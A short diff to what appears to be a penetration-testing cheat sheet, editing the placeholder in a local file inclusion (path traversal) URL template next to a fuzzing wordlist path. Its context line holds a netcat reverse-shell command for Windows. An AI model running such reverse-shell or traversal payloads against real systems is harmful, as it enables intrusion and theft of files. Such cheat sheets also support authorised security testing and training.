@@ -118,7 +118,7 @@ Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
 
 #### LFI
 
-<code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=../../../../[PATH_TO_LOCAL_FILE]</code>
+<code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=../../../../[PATH/TO/LOCAL/FILE]</code>
 
 Linux: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>
 
